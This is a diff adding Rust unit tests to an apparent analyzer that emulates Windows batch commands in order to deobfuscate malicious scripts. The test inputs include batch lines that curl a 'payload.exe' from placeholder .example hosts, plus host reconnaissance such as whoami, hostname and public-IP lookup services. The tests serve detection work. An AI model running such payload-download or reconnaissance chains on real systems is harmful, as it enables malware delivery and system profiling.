@@ -2949,6 +2949,28 @@ for /f "tokens=* delims=" %%U in ('cmd /c type url.txt') do curl -o payload.exe 
     }
 
     #[test]
+    fn for_f_cmd_combined_switch_type_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-cmd-combined-switch.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('cmd /d/c type url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-cmd-combined-switch.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F cmd /d/c type source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_type_reads_multiple_generated_file_sources() {
         let report = analyze(
             br#"echo noise>first.txt
@@ -2994,6 +3016,77 @@ for /f "tokens=* delims=" %%U in ('type first.txt second.txt ^| find "https://"'
     }
 
     #[test]
+    fn for_f_reads_hostname_output() {
+        let script = b"for /f \"tokens=*\" %%H in ('hostname') do echo host=%%H\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo host=MISCREANTTEARS"),
+            "hostname output did not feed FOR body: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(
+                |t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline == "hostname")
+            ),
+            "hostname should resolve synthetically: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_reads_whoami_user_sid_output() {
+        let script = b"for /f \"skip=1 tokens=2\" %%S in ('whoami /user') do echo sid=%%S\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo sid=S-1-5-21-1000-1000-1000-1001"),
+            "whoami /user SID did not feed FOR body: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_reads_date_and_time_output() {
+        let script = concat!(
+            "for /f \"tokens=2\" %%D in ('date /t') do set TODAY=%%D\r\n",
+            "for /f \"tokens=1\" %%T in ('time /t') do set NOW=%%T\r\n",
+            "echo stamp=%TODAY%_%NOW%\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo stamp=06/15/2026_12:00"),
+            "date/time output did not feed later variables: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.eq_ignore_ascii_case("date /t")
+                        || pipeline.eq_ignore_ascii_case("time /t")
+            )),
+            "date/time should resolve synthetically: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_reads_powershell_get_process_name_output() {
+        let script = "for /f \"tokens=*\" %%P in ('powershell -Command \"Get-Process explorer | Select-Object -ExpandProperty ProcessName\"') do echo proc=%%P\r\n";
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo proc=explorer"),
+            "powershell Get-Process output did not feed FOR body: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_reads_version_and_powershell_inventory_output() {
         let script = concat!(
             "for /f \"tokens=4-5 delims=. \" %%i in ('ver') do set VERSION=%%i.%%j\r\n",
@@ -3018,6 +3111,52 @@ for /f "tokens=* delims=" %%U in ('type first.txt second.txt ^| find "https://"'
                 .iter()
                 .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
             "standard inventory commands should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_where_recursive_powershell_feeds_later_command() {
+        let script = concat!(
+            "for /f \"tokens=* delims=\" %%P in ('where /r %windir% powershell.exe') do set \"POSH=%%P\"\r\n",
+            "for /f \"tokens=*\" %%D in ('%POSH% -Command \"Get-Date -UFormat '%%H%%M%%S'\"') do echo time=%%D\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo time=120000"),
+            "recursive where result did not feed later powershell command: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(
+                |t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("where /r"))
+            ),
+            "recursive where powershell lookup should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_reads_wmic_localdatetime_output() {
+        let script = concat!(
+            "for /f \"tokens=2 delims==.\" %%T in ('wmic os get LocalDateTime /value') do set TS=%%T\r\n",
+            "echo ts=%TS%\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo ts=20260615120000"),
+            "wmic LocalDateTime output did not feed later variable: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.to_ascii_lowercase().contains("localdatetime")
+            )),
+            "wmic LocalDateTime should resolve synthetically: {:?}",
             report.traits
         );
     }
@@ -9647,6 +9786,25 @@ echo %MARK%
     }
 
     #[test]
+    fn synth_cmd_combined_switch_runs_child_pipeline() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "url.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://cmd-combined-switch.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline("cmd /d/c type url.txt", &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://cmd-combined-switch.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
     fn synth_type_concatenates_tracked_file_arguments() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -9775,6 +9933,22 @@ echo %MARK%
     }
 
     #[test]
+    fn synth_curl_public_ip_endpoints_return_stable_response() {
+        let mut env = Environment::new(&Config::default());
+        for endpoint in [
+            "https://api.ipify.org",
+            "https://ifconfig.me/ip",
+            "https://icanhazip.com",
+            "https://ipv4.icanhazip.com",
+            "https://checkip.amazonaws.com",
+            "https://ipinfo.io/ip",
+        ] {
+            let lines = run_pipeline(&format!("curl -s {endpoint}"), &mut env);
+            assert_eq!(lines, vec!["203.0.113.10".to_string()], "{endpoint}");
+        }
+    }
+
+    #[test]
     fn synth_curl_file_url_reads_virtual_file() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -9800,6 +9974,53 @@ echo %MARK%
         );
         let lines = run_pipeline("curl file://localhost/C:/temp/payload.txt", &mut env);
         assert_eq!(lines, vec!["one".to_string(), "two".to_string()]);
+    }
+
+    #[test]
+    fn synth_hostname_returns_computername() {
+        let mut env = Environment::new(&Config::default());
+        let lines = run_pipeline("hostname", &mut env);
+
+        assert_eq!(lines, vec!["MISCREANTTEARS".to_string()]);
+    }
+
+    #[test]
+    fn synth_whoami_user_returns_sid_table() {
+        let mut env = Environment::new(&Config::default());
+        let lines = run_pipeline("whoami /user", &mut env);
+
+        assert_eq!(
+            lines,
+            vec![
+                "User Name SID".to_string(),
+                "miscreanttears\\puncher S-1-5-21-1000-1000-1000-1001".to_string()
+            ]
+        );
+    }
+
+    #[test]
+    fn synth_date_and_time_return_stable_values() {
+        let mut env = Environment::new(&Config::default());
+
+        assert_eq!(
+            run_pipeline("date /t", &mut env),
+            vec!["Mon 06/15/2026".to_string()]
+        );
+        assert_eq!(
+            run_pipeline("time /t", &mut env),
+            vec!["12:00 PM".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_wmic_localdatetime_returns_stable_value() {
+        let mut env = Environment::new(&Config::default());
+        let lines = run_pipeline("wmic os get LocalDateTime /value", &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["LocalDateTime=20260615120000.000000-000".to_string()]
+        );
     }
 }
 
